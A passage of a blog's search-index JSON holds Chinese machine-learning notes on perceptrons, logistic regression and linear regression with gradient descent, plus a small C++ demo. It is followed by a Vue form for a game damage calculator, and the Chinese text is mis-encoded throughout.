","date":"2024-10-29","objectID":"/posts/ml%E6%84%9F%E7%9F%A5%E6%9C%BA/:1:1","tags":["æ„ŸçŸ¥æœº"],"title":"æ„ŸçŸ¥æœº","uri":"/posts/ml%E6%84%9F%E7%9F%A5%E6%9C%BA/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"å­¦ä¹ ç­–ç•¥ æ•°æ®é›†çš„çº¿æ€§å¯åˆ†æ€§ å¯¹æ‰€æœ‰æ­£ç±»çš„æ•°æ®é›†éƒ½æœ‰ $w \\cdot x + b \u003e 0$ï¼Œè´Ÿç±»æ•°æ®é›† $w \\cdot x + b \u003c 0$ å¦‚ä¸Šå›¾ï¼Œè€ƒè™‘ä¸¤ä¸ªç‰¹å¾ $x_1,x_2$ï¼Œç±»å‹ç”¨ x å’Œ o æ¥è¡¨ç¤ºï¼Œx ç±»å‹éƒ½åœ¨ç›´çº¿çš„ä¸‹æ–¹ï¼Œå¸¦å…¥ç›´çº¿æ–¹ç¨‹ä¼šå‘ç°å‡å°äº $0$ï¼Œé‚£ä¹ˆ $\\text{sign}$ å€¼å°±ä¸º $-1$ æŸå¤±å‡½æ•° é¦–å…ˆç‰¹å¾å‘é‡ $x_0$ åˆ°è¶…å¹³é¢çš„è·ç¦»ä¸º $\\dfrac{|wx_0 + b|}{||w||}$ï¼Œå…¶ä¸­ $||w||$ æ˜¯ $L_2$ èŒƒæ•°ï¼Œå³ $\\sqrt{\\sum\\limits_{i = 1} ^ {n}w_i^2}$ æˆ‘ä»¬åªè€ƒè™‘é”™è¯¯åˆ†ç±»çš„ç‚¹åˆ°è¶…å¹³é¢çš„è·ç¦»ï¼Œå¯¹äºè¯¯åˆ†ç±»çš„ç‚¹ $(x_i,y_i)$ï¼Œ$-y_i(w \\cdot x + b) \u003e 0$ æˆç«‹ï¼Œå› ä¸ºå‡è®¾è¯¥ç‚¹ä¸ºæ­£ç±» ($y_i = 1$)ï¼Œç”±äºè¯¯åˆ†ç±»é‚£ä¹ˆä»–ä¼šåœ¨ç›´çº¿ä¸‹æ–¹ï¼Œå¯¼è‡´ $w \\cdot x + b \u003c 0$ï¼Œæ‰€ä»¥ $-1 \\times (w \\cdot x + b) \u003e 0$ï¼Œè´Ÿç±»åˆ™ç›¸åŒã€‚ æ­¤æ—¶è¯¯åˆ†ç±»ç‚¹åˆ°è¶…å¹³é¢çš„è·ç¦»å°±ä¸º $-\\dfrac{y_i(wx_i + b)}{||w||}$ï¼Œè®¾è¯¯åˆ†ç±»ç‚¹çš„é›†åˆä¸º $M$ï¼Œé‚£ä¹ˆæ€»è·ç¦»å°±ä¸º $$ -\\frac{1}{||w||}\\sum_{x_i \\in M} y_i (w \\cdot x_i + b) $$ ä¸è€ƒè™‘ $\\dfrac{1}{||w||}$ï¼Œå°±å¾—åˆ°äº†æŸå¤±å‡½æ•° $L(w, b) = -\\sum\\limits_{x_i \\in M} y_i (w \\cdot x_i + b)$ï¼Œæ­¤å‡½æ•°è¿ç»­å¯å¯¼ã€‚ æˆ‘ä»¬è€ƒè™‘æœ€å°åŒ–æŸå¤±å‡½æ•°ã€‚é¦–å…ˆä»»é€‰ä¸€ä¸ªè¶…å¹³é¢ $w_0,b_0$ï¼Œç„¶åéšæœºé€‰æ‹©ä¸€ä¸ªè¯¯åˆ†ç±»ç‚¹æ¢¯åº¦ä¸‹é™ã€‚ $$ \\frac{\\partial L(w, b)}{\\partial w} = -\\sum_{x_i \\in M}y_ix_i \\ \\frac{\\partial L(w, b)}{\\partial b} = -\\sum_{x_i \\in M}y_i $$ éšæœºé€‰æ‹©è¯¯åˆ†ç±»ç‚¹ $(x_i,y_i)$ å¯¹ $w, b$ è¿›è¡Œæ›´æ–°ï¼š$w + \\alpha y_ix_i, b + \\alpha y_i$ï¼Œæœ€åç›´åˆ°æŸå¤±å‡½æ•°ä¸º $0$ ä¸ºæ­¢ã€‚ å¯¹å¶å½¢å¼ ç”±äºæ¯æ¬¡å¯¹éšæœºä¸€ä¸ªç‚¹è¿›è¡Œæ¢¯åº¦ä¸‹é™ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä»ç»“æœè€ƒè™‘ï¼Œå‡è®¾ç¬¬ $i$ ä¸ªç‚¹æ›´æ–°çš„æ¬¡æ•°ä¸º $k_i$ æ¬¡ï¼Œé‚£ä¹ˆæœ€ç»ˆçš„ $w, b$ å°±ä¸º $w = \\sum\\limits_{i = 1} ^ {n}\\alpha k_i y_ix_i, b = \\sum\\limits_{i = 1} ^ {n}\\alpha k_i y_i$ï¼Œé‚£ä¹ˆæ„ŸçŸ¥æœºæ¨¡å‹å°±ä¸º $\\text{sign}\\left(\\sum\\limits_{j = 1} ^ {n}\\alpha k_j y_j x_j \\cdot x +b \\right)$ è®­ç»ƒçš„æ—¶å€™å¯¹äºæŸä¸ªç‚¹ $(x_i,y_i)$ å¦‚æœ $y_i \\left(\\sum\\limits_{j = 1} ^ {n}\\alpha k_j y_j x_j \\cdot x_i +b \\right) \\le 0$ï¼Œå°±ï¼š$k_i + 1, b + \\alpha y_i$ï¼Œç›´åˆ°æ²¡æœ‰è¯¯åˆ†ç±»æ•°æ®ã€‚ ç”±äºæ•°æ®å¤§é‡å‡ºç° $x_i \\cdot x_j$ï¼Œä¸ºäº†æ–¹ä¾¿å¯ä»¥å…ˆç®—å‡º Gram çŸ©é˜µ $\\textbf{G} = [x_i\\cdot x_j]_{n \\times n}$ï¼Œå³ $x$ å‘é‡ç»„è‡ªå·±å’Œè‡ªå·±åš $n \\times n$ çš„çŸ©é˜µä¹˜æ³•ã€‚ ","date":"2024-10-29","objectID":"/posts/ml%E6%84%9F%E7%9F%A5%E6%9C%BA/:1:2","tags":["æ„ŸçŸ¥æœº"],"title":"æ„ŸçŸ¥æœº","uri":"/posts/ml%E6%84%9F%E7%9F%A5%E6%9C%BA/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"åˆ†ç±» æœ‰äº›æ•°æ®ä¾‹å¦‚ï¼šå®¢æˆ·æ˜¯å¦ä¼šè´­ä¹°æŸä¸ªå•†å“ï¼Œä»–çš„ç»“æœåªæœ‰ 0 ä¸ 1ï¼Œå¦‚æœä½¿ç”¨çº¿æ€§å›å½’ï¼Œæ•ˆæœä¼šéå¸¸å·®ã€‚æ‰€ä»¥æˆ‘ä»¬è€ƒè™‘å¼•å…¥æ–°çš„æ¨¡å‹æ¥æ‹Ÿåˆè¿™äº›æ•°æ®ã€‚ ","date":"2024-10-29","objectID":"/posts/ml%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/:1:0","tags":["é€»è¾‘å›å½’"],"title":"é€»è¾‘å›å½’","uri":"/posts/ml%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"sigmoid å‡½æ•° é€»è¾‘å›å½’çš„æ‹Ÿåˆå‡½æ•°æ˜¯ sigmoid å‡½æ•°ï¼š$f(z) = \\dfrac{1}{1+e^{-z}}$ é€šè¿‡å‡½æ•°å›¾åƒçš„è§‚å¯Ÿï¼Œæˆ‘ä»¬å¯ä»¥å‘ç° $\\lim\\limits_{x \\rightarrow \\infty} f(x) = 1, \\lim\\limits_{x \\rightarrow -\\infty} f(x) = 0, f(0) = \\dfrac{1}{2}$ è¿™æ ·å°±å¾ˆå·§å¦™åˆå¾ˆå…‰æ»‘çš„(æŒ‡å‡½æ•°å›¾åƒ)å»ºç«‹äº†ä¸€ä¸ª 0/1 çš„å‡½æ•°æ¨¡å‹ã€‚ ä»–è¡¨ç¤ºè¿™ä¸ªäº‹ä»¶é¢„æµ‹çš„æ¦‚ç‡ï¼Œå¦‚æœ $\\dfrac{1}{2} \\le f(x)$ï¼Œåˆ™äº‹ä»¶é¢„æµ‹å‘ç”Ÿï¼Œç›¸å $f(x) \u003c \\dfrac{1}{2}$ï¼Œäº‹ä»¶é¢„æµ‹ä¸å‘ç”Ÿã€‚ ","date":"2024-10-29","objectID":"/posts/ml%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/:2:0","tags":["é€»è¾‘å›å½’"],"title":"é€»è¾‘å›å½’","uri":"/posts/ml%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"å†³ç­–è¾¹ç•Œ å·²ç»æœ‰äº†å‡è®¾å‡½æ•°äº†ï¼Œç°åœ¨è€ƒè™‘ä»€ä¹ˆæ—¶å€™å°†æŸä¸ªæ ·æœ¬é¢„æµ‹ä¸ºæ­£ç±»ï¼Œä»€ä¹ˆæ—¶å€™é¢„æµ‹ä¸ºè´Ÿç±»ã€‚ä¹Ÿå°±æ˜¯è¯´ç”¨ä¸€ä¸ªæ–¹ç¨‹æ¥æŠŠæ•°æ®åˆ’åˆ†ä¸ºä¸¤ç±»ï¼Œåœ¨ä¸€ä¾§æ˜¯ä¸€ç±»ï¼Œåœ¨å¦ä¸€ä¾§æ˜¯å¦ä¸€ç±»ã€‚ ","date":"2024-10-29","objectID":"/posts/ml%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/:3:0","tags":["é€»è¾‘å›å½’"],"title":"é€»è¾‘å›å½’","uri":"/posts/ml%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"çº¿æ€§å†³ç­–è¾¹ç•Œ å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæ­¤çº¿æ€§æ•°æ®çš„å†³ç­–è¾¹ç•Œä¸º $x_1 + x_2 - 3 = 0$ï¼Œå¦‚æœ $x_1 + x_2 - 3 \u003e 0$ æ—¶ï¼Œå°±ä¼šåœ¨è¿™æ¡ç›´çº¿çš„ä¸Šæ–¹åˆ¤å®šä¸ºå±äº 1 ç±»ï¼Œé‚£ sigmoid å‡½æ•°å€¼å°±ä¼šå¤§äºç­‰äº $0.5$ï¼Œåä¹‹ã€‚ ","date":"2024-10-29","objectID":"/posts/ml%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/:3:1","tags":["é€»è¾‘å›å½’"],"title":"é€»è¾‘å›å½’","uri":"/posts/ml%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"éçº¿æ€§å†³ç­–è¾¹ç•Œ è¿™é‡Œçš„å†³ç­–è¾¹ç•Œä¸º $x_1^2 + x_2^2 - 1 = 0$ï¼Œå¦‚æœåœ¨åœ†å†…æ˜¯ä¸€ç±»ï¼Œåœ¨åœ†å¤–æ˜¯å¦ä¸€ç±»ã€‚ ","date":"2024-10-29","objectID":"/posts/ml%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/:3:2","tags":["é€»è¾‘å›å½’"],"title":"é€»è¾‘å›å½’","uri":"/posts/ml%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"æŸå¤±å‡½æ•° å¦‚æœæŒ‰ç…§çº¿æ€§å›å½’çš„è®¡ç®—æ–¹å¼ï¼Œç›´æ¥ç”¨ y å’Œ sigmoid å‡½æ•°åšå·®ï¼Œä¼šå¯¼è‡´æŸå¤±å‡½æ•°ä¸æ˜¯å‡¸å‡½æ•°ï¼Œä¸å®¹æ˜“ä¼˜åŒ–ï¼Œå®¹æ˜“é™·å…¥å±€éƒ¨æœ€å°å€¼ã€‚æ‰€ä»¥é€»è¾‘å›å½’è¦ç”¨å¯¹æ•°å‡½æ•°æ¥åšæŸå¤±å‡½æ•°ã€‚ $$ J(\\theta)=-\\frac{1}{m}\\sum_{i = 1} ^ {n}(y_i\\log(h(x_i))+(1-y_i)\\log(1-h(x_i))) $$ å¯¹äºæ¢¯åº¦ä¸‹é™ï¼Œä¹Ÿæ˜¯ $\\theta_i - \\alpha \\dfrac{\\partial J}{\\partial\\theta_i}$ ","date":"2024-10-29","objectID":"/posts/ml%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/:4:0","tags":["é€»è¾‘å›å½’"],"title":"é€»è¾‘å›å½’","uri":"/posts/ml%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"å¤šå…ƒåˆ†ç±» å‡è®¾æˆ‘ä»¬çš„è®­ç»ƒé›†ä¸­æœ‰ä¸‰ç§ç‰©å“ï¼Œæˆ‘ä»¬å¯ä»¥è®­ç»ƒä¸‰ä¸ªåˆ†ç±»å™¨å¦‚ä¸Šå›¾ï¼Œåˆ†åˆ«å°†å…¶ä¸­çš„ä¸€ç±»å½“æ­£ç±»ï¼Œå…¶ä»–éƒ½å½“è´Ÿç±»ï¼Œç„¶åè¿›è¡Œä¸€æ¬¡äºŒå…ƒåˆ†ç±»ã€‚è®¡ç®—å®Œä¸‰ä¸ªåˆ†ç±»å™¨åï¼Œåœ¨é¢„æµ‹æ—¶ï¼Œå‘ä¸‰ä¸ªåˆ†ç±»å™¨ä¸­è¾“å…¥ä¸€ä¸ªæ•°æ®ï¼Œå°†ä¼šåˆ†åˆ«è¿”å›ä¸‰ä¸ªæ¦‚ç‡ï¼Œé€‰æ‹©æ¦‚ç‡æœ€å¤§çš„é‚£ä¸ªå½“åšé¢„æµ‹ç±»åˆ«ã€‚ ","date":"2024-10-29","objectID":"/posts/ml%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/:4:1","tags":["é€»è¾‘å›å½’"],"title":"é€»è¾‘å›å½’","uri":"/posts/ml%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"å•å˜é‡çº¿æ€§å›å½’ ","date":"2024-10-28","objectID":"/posts/ml%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/:1:0","tags":["çº¿æ€§å›å½’"],"title":"çº¿æ€§å›å½’","uri":"/posts/ml%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"æ¨¡å‹è¡¨ç¤º ä»¥æœ€ç»å…¸çš„é—®é¢˜ä¸ºä¾‹ï¼Œå‡è®¾ç°åœ¨æˆ‘ä»¬è¦é¢„æµ‹æˆ¿ä»·æ•°æ®ï¼Œä¸”ç›®å‰æˆ¿ä»·åªè·Ÿä¸€ä¸ªå› ç´ æœ‰å…³ã€‚ å®é™…ä¸Šå°±æ˜¯ç”¨ä¸€æ¡ç›´çº¿æ‹Ÿåˆä¸€äº›æ•°æ®ï¼Œç­‰åŒäºé«˜ä¸­å­¦è¿‡çš„å›å½’ç›´çº¿æ–¹ç¨‹ã€‚æˆ‘ä»¬å‡è®¾ç”¨ $h(x) = \\theta_0 + \\theta_1x$ æ¥å¯¹æ•°æ®åšå›å½’ã€‚ ","date":"2024-10-28","objectID":"/posts/ml%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/:1:1","tags":["çº¿æ€§å›å½’"],"title":"çº¿æ€§å›å½’","uri":"/posts/ml%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"æŸå¤±å‡½æ•° æŸå¤±å‡½æ•°å°±æ˜¯è¯¯å·®å€¼ï¼Œå‡è®¾æ•°æ®é›†ä¸º $(x_i,y_i)$ï¼Œé‚£ä¹ˆè¯¯å·®å€¼å°±ä¸ºæ¯ä¸ªç‚¹åˆ°ç›´çº¿çš„è·ç¦»ä¹‹å’Œï¼Œå³ $\\sum\\limits_{i=0} ^ {n}(h(x_i) - y_i)^2$ï¼Œä¸ºäº†æ–¹ä¾¿åç»­çš„æ¢¯åº¦ä¸‹é™ï¼Œè¿™é‡Œè·ç¦»é€‰æ‹©ç”¨å¹³æ–¹è€Œä¸æ˜¯ç»å¯¹å€¼ã€‚ ç°åœ¨æŠŠä¸Šè¿°æŸå¤±å‡½æ•°çœ‹ä½œä¸€ä¸ªäºŒå…ƒå‡½æ•° (å› ä¸ºæ–œç‡å’Œæˆªè·éƒ½æ˜¯ä¸ç¡®å®šå˜é‡)ï¼Œå³ $J(\\theta_0, \\theta_1) = \\sum\\limits_{i=0} ^ {n}(\\theta_0 + \\theta_1x_i - y_i)^2$ï¼Œæˆ‘ä»¬éœ€è¦å°†æŸå¤±å‡½æ•°æœ€å°åŒ–ã€‚è¿™ä¸ªäºŒå…ƒå‡½æ•°å°±æ˜¯ç©ºé—´ä¸­çš„ä¸€ä¸ªå±±è°·ï¼Œæˆ‘ä»¬éœ€è¦ç”¨æ¢¯åº¦ä¸‹é™æ³•æ¥æ‰¾åˆ°â€œè°·åº•â€ï¼Œå³æŸå¤±æœ€å°çš„ç‚¹ã€‚ ","date":"2024-10-28","objectID":"/posts/ml%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/:1:2","tags":["çº¿æ€§å›å½’"],"title":"çº¿æ€§å›å½’","uri":"/posts/ml%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"æ¢¯åº¦ä¸‹é™ å…ˆä»¥ä¸€å…ƒå‡½æ•°ä¸ºä¾‹ï¼Œç°å‡è®¾æœ‰ $f(x) = x ^ 2$ï¼Œç°åœ¨æœ‰ä¸€ä¸ªå°çƒåœ¨ç‚¹ $x_0 = (10, f(10))$ å¤„ï¼Œè¯¥ç‚¹çš„å¯¼æ•°ä¸º $f'(10) = 2 \\times 10 = 20$ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ­¤æ—¶å¼•å…¥ä¸€ä¸ªå­¦ä¹ ç‡ $\\alpha$ (ç›¸å½“äºæ­¥é•¿)ï¼Œç”¨å­¦ä¹ ç‡ä¹˜ä»¥è¯¥ç‚¹çš„è´Ÿå¯¼æ•°ï¼Œå†åŠ ä¸Šè¯¥ç‚¹çš„åæ ‡ï¼Œç›¸å½“äºè¯¥ç‚¹åœ¨å‡½æ•°ä¸Šç§»åŠ¨ã€‚å‡è®¾ $\\alpha = 0.2$ï¼Œåˆ™æ–°ä½ç½® $x_1 = x_0 - 0.2 \\times 20 = 6$ï¼Œå³ $x_1 = (6, f(6))$ï¼Œç»§ç»­è¿­ä»£ï¼Œ$x_2 = x_1 - 0.2 \\times (2 \\times 6) = 3.6$ï¼Œå¦‚æ­¤è¿­ä»£ä¸‹å»ï¼Œå‘ç°æœ€ç»ˆæ–°çš„ä½ç½®ä¼šæ— é™æ¥è¿‘äº $0$ï¼Œå³å‡½æ•°çš„æœ€å°å€¼å¤„ã€‚ #include \u003cbits/stdc++.h\u003e #define int long long using namespace std; signed main() { double x = 10, alpha = 0.2; for (int i = 1; i \u003c= 20; i ++) { x += -2 * x * alpha; cout \u003c\u003c x \u003c\u003c \"\\n\"; } } ç”¨ C++ ä»£ç æ¨¡æ‹Ÿ 20 æ¬¡çš„è¾“å‡ºç»“æœï¼š 6 3.6 2.16 1.296 0.7776 0.46656 0.279936 0.167962 0.100777 0.0604662 0.0362797 0.0217678 0.0130607 0.00783642 0.00470185 0.00282111 0.00169267 0.0010156 0.00060936 0.000365616 ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿå› ä¸ºå¯¼æ•°æ˜¯æè¿°å‡½æ•°å˜åŒ–ç‡çš„ï¼Œè¶Šé è¿‘æå€¼ç‚¹å¯¼æ•°è¶Šå°ï¼Œæ¯æ¬¡èµ°çš„æ­¥é•¿å°±å°ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒæ•´ $\\alpha$ æ¥æ”¹å˜è¿™ä¸ªè¿‡ç¨‹ã€‚ä¸‹é¢æ˜¯ä¸€äº›è°ƒå‚çš„ç»“æœï¼š å¯¹äºäºŒå…ƒå‡½æ•°ï¼ŒåŒæ ·å’Œä¸Šè¿°è¿‡ç¨‹ç±»ä¼¼ï¼Œéœ€è¦æŠŠæ±‚å¯¼æ”¹ä¸ºåå¯¼ï¼Œå³ $\\theta_i -\\alpha\\dfrac{\\partial J}{\\partial \\theta_i}$ ","date":"2024-10-28","objectID":"/posts/ml%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/:1:3","tags":["çº¿æ€§å›å½’"],"title":"çº¿æ€§å›å½’","uri":"/posts/ml%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"å¤šå˜é‡çº¿æ€§å›å½’ å‡è®¾ç°åœ¨æœ‰å¾ˆå¤šå˜é‡å½±å“äº†æˆ¿ä»·å› ç´ ï¼Œè¿™äº›ç‰¹å¾ä¸º $(x_1,x_2,\\cdots,x_n)$ï¼Œæ­¤æ—¶æ¨¡å‹ä¹Ÿå¿…é¡»è¡¨è¿°ä¸ºä¸€ä¸ªè¶…å¹³é¢ $h(x_1,x_2,\\cdots,x_n) = \\theta_0 + \\sum\\limits_{i = 1}^{n}\\theta_ix_i$ï¼Œç”±äºå˜é‡å¤ªå¤šäº†æˆ‘ä»¬ç”¨çŸ©é˜µè¡¨ç¤º $\\theta=\\begin{bmatrix} \\theta_0 \u0026 \\cdots \u0026 \\theta_n \\end{bmatrix}, X = \\begin{bmatrix} 0 \\\\ x_1 \\\\ \\vdots \\\\ x_n \\end{bmatrix}$ åˆ™ $h(X) = \\theta X$ï¼Œé‚£ä¹ˆæŸå¤±å‡½æ•°å°±ä¸º $J(\\theta) = \\sum\\limits_{i = 1} ^ {n}(\\theta X_i - y_i)^2$ æ¢¯åº¦ä¸‹é™ï¼š$\\theta_i - \\alpha\\sum\\limits_{i = 1} ^ {n} 2x_i(h(x_i) - y_i) $ ","date":"2024-10-28","objectID":"/posts/ml%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/:2:0","tags":["çº¿æ€§å›å½’"],"title":"çº¿æ€§å›å½’","uri":"/posts/ml%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"ç‰¹å¾ç¼©æ”¾ åœ¨æˆ‘ä»¬é¢å¯¹å¤šç»´ç‰¹å¾é—®é¢˜çš„æ—¶å€™ï¼Œæˆ‘ä»¬è¦ä¿è¯è¿™äº›ç‰¹å¾éƒ½å…·æœ‰ç›¸è¿‘çš„å°ºåº¦ï¼Œè¿™å°†å¸®åŠ©æ¢¯åº¦ä¸‹é™ç®—æ³•æ›´å¿«åœ°æ”¶æ•›ã€‚ä»¥æˆ¿ä»·é—®é¢˜ä¸ºä¾‹ï¼Œå‡è®¾æˆ‘ä»¬ä½¿ç”¨ä¸¤ä¸ªç‰¹å¾ï¼Œæˆ¿å±‹çš„å°ºå¯¸å’Œæˆ¿é—´çš„æ•°é‡ï¼Œå°ºå¯¸çš„å€¼ä¸º 02000 å¹³æ–¹è‹±å°ºï¼Œè€Œæˆ¿é—´æ•°é‡çš„å€¼åˆ™æ˜¯ 05ï¼Œä»¥ä¸¤ä¸ªå‚æ•°åˆ†åˆ«ä¸ºæ¨ªçºµåæ ‡ï¼Œç»˜åˆ¶ä»£ä»·å‡½æ•°çš„ç­‰é«˜çº¿å›¾èƒ½ï¼Œçœ‹å‡ºå›¾åƒä¼šæ˜¾å¾—å¾ˆæ‰ï¼Œæ¢¯åº¦ä¸‹é™ç®—æ³•éœ€è¦éå¸¸å¤šæ¬¡çš„è¿­ä»£æ‰èƒ½æ”¶æ•›ã€‚æˆ‘ä»¬å¯ä»¥å°†æˆ¿å±‹å¤§å°é™¤ä»¥ 2000ï¼Œå°†å§å®¤ä¸ªæ•°é™¤ä»¥ 5ï¼Œå†ç”»å‡ºç­‰é«˜çº¿å›¾å°±æ¯”è¾ƒåˆé€‚äº†ï¼ˆå¦‚ä¸‹å›¾å³ï¼‰ã€‚ å‡å€¼å½’ä¸€åŒ– å°†æ•°å€¼éƒ½ç¼©æ”¾åœ¨ $[-1,1]$ ä¹‹é—´ï¼Œå…¬å¼ï¼š$x_i = \\dfrac{x_i - \\mu}{s}$ï¼Œå…¶ä¸­ $\\mu$ è¡¨ç¤ºå¹³å‡å€¼ï¼Œ$s$ è¡¨ç¤ºæ ‡å‡†å·® ","date":"2024-10-28","objectID":"/posts/ml%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/:2:1","tags":["çº¿æ€§å›å½’"],"title":"çº¿æ€§å›å½’","uri":"/posts/ml%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"categories":["æœºå™¨å­¦ä¹ "],"content":"å­¦ä¹ ç‡é€‰å– æ¢¯åº¦ä¸‹é™ç®—æ³•çš„æ¯æ¬¡è¿­ä»£å—åˆ°å­¦ä¹ ç‡çš„å½±å“ï¼Œå¦‚æœå­¦ä¹ ç‡è¿‡å°ï¼Œåˆ™è¾¾åˆ°æ”¶æ•›æ‰€éœ€çš„è¿­ä»£æ¬¡æ•°ä¼šéå¸¸é«˜ï¼›å¦‚æœå­¦ä¹ ç‡è¿‡å¤§ï¼Œæ¯æ¬¡è¿­ä»£å¯èƒ½ä¸ä¼šå‡å°ä»£ä»·å‡½æ•°ï¼Œå¯èƒ½ä¼šè¶Šè¿‡å±€éƒ¨æœ€å°å€¼å¯¼è‡´æ— æ³•æ”¶æ•›ã€‚ é€šå¸¸å¯ä»¥è€ƒè™‘å°è¯•äº›å­¦ä¹ ç‡ï¼š$\\alpha = 0.01, 0.03, 0.1, 0.3, 1, 3,10$ ","date":"2024-10-28","objectID":"/posts/ml%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/:2:2","tags":["çº¿æ€§å›å½’"],"title":"çº¿æ€§å›å½’","uri":"/posts/ml%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"categories":["æ¸¸æˆ"],"content":"\u003c!doctype html\u003e Vite + Vue ","date":"2024-10-20","objectID":"/posts/game%E5%88%9B%E6%83%B3%E5%85%B5%E5%9B%A2%E4%B8%80%E6%9E%AA%E4%BC%A4%E5%AE%B3%E8%AE%A1%E7%AE%97/:0:0","tags":["è®¡ç®—"],"title":"åˆ›æƒ³å…µå›¢ä¸€æªä¼¤å®³è®¡ç®—","uri":"/posts/game%E5%88%9B%E6%83%B3%E5%85%B5%E5%9B%A2%E4%B8%80%E6%9E%AA%E4%BC%A4%E5%AE%B3%E8%AE%A1%E7%AE%97/"},{"categories":["æ¸¸æˆ"],"content":"ä»£ç  \u003ctemplate\u003e \u003cel-form ref=\"formRef\" style=\"max-width: 600px\" :model=\"info\" :rules=\"rules\" label-width=\"auto\" status-icon \u003e \u003cel-form-item label=\"æ­¦å™¨\" prop=\"weapon\"\u003e \u003cel-select v-model=\"info.weapon\" value-key=\"damage\" placeholder=\"é€‰æ‹©æ­¦å™¨\" style=\"width: 300px\"\u003e \u003cel-option v-for=\"item in weapons\" :key=\"item.damage\" :label=\"item.name + ' ä¼¤å®³:' + item.damage\" :value=\"item\" \u003e \u003cspan style=\"float: left\"\u003e{{ item.name }}\u003c/span\u003e \u003cspan style=\" float: right; color: var(--el-text-color-secondary); font-size: 13px; \"\u003e ä¼¤å®³:{{ item.damage }} \u003c/span\u003e \u003c/el-option\u003e \u003c/el-select\u003e \u003c/el-form-item\u003e \u003cel-form-item label=\"æ­¦å™¨å¼ºåŒ–ç­‰çº§\" prop=\"level\"\u003e \u003cel-input-number v-model=\"info.level\" :min=\"0\" :max=\"20\" @change=\"handleChange\" /\u003e \u003c/el-form-item\u003e \u003cel-form-item label=\"å·±æ–¹ç ´ç”²\" prop=\"breakArmor\"\u003e \u003cel-input-number v-model=\"info.breakArmor\" :min=\"0\" :max=\"40\" @change=\"handleChange\" /\u003e \u003c/el-form-item\u003e \u003cel-form-item label=\"å¯¹æ–¹æŠ¤ç”²\" prop=\"Armor\"\u003e \u003cel-input-number v-model=\"info.Armor\" :min=\"0\" :max=\"400\" @change=\"handleChange\" /\u003e \u003c/el-form-item\u003e \u003cel-form-item label=\"ä¼¤å®³ç±»å‹\" prop=\"Critical\"\u003e \u003cel-radio-group v-model=\"info.Critical\"\u003e \u003cel-radio :value=\"1\"\u003eæ™®é€š\u003c/el-radio\u003e \u003cel-radio :value=\"2.5\"\u003eæš´å‡»(è‡´å‘½æ‰“å‡»)\u003c/el-radio\u003e \u003cel-radio :value=\"3\"\u003eç‹¼æš´(ç‹¼å¡ + è‡´å‘½æ‰“å‡»)\u003c/el-radio\u003e \u003c/el-radio-group\u003e \u003c/el-form-item\u003e \u003cel-form-item label=\"æ”¹é€ ä¼¤å®³\" prop=\"addDamage\"\u003e \u003cel-input-number v-model=\"info.addDamage\" :min=\"0\" :max=\"43\" @change=\"handleChange\" /\u003e \u003c/el-form-item\u003e \u003cel-form-item label=\"ä¼¤å®³æµ®åŠ¨ç™¾åˆ†æ¯”\" prop=\"addDamage\"\u003e \u003cel-input-number v-model=\"info.damageFloat\" :min=\"-6\" :max=\"6\" @change=\"handleChange\" /\u003e \u003c/el-form-item\u003e \u003cel-form-item\u003e \u003cel-button type=\"primary\" @click=\"calc(formRef)\"\u003eè®¡ç®—\u003c/el-button\u003e \u003c/el-form-item\u003e \u003c/el-form\u003e \u003cel-text class=\"mx-1\" type=\"danger\" v-if=\"show\"\u003eä¼¤å®³æ•°å€¼ï¼š{{ damage }}\u003c/el-text\u003e \u003c/template\u003e \u003cscript lang=\"ts\" setup\u003e import { ref, reactive } from 'vue' import type { FormInstance } from 'element-plus' const formRef = ref\u003cFormInstance\u003e() const info = reactive({ weapon: undefined, level: 0, breakArmor: 0, Armor: 0, Critical: undefined, addDamage: 0, damageFloat: 0 }) const rules = reactive({ weapon: [{ required: true, message: 'è¯·é€‰æ‹©æ­¦å™¨', trigger: 'change', }], Critical: [{ required: true, message: 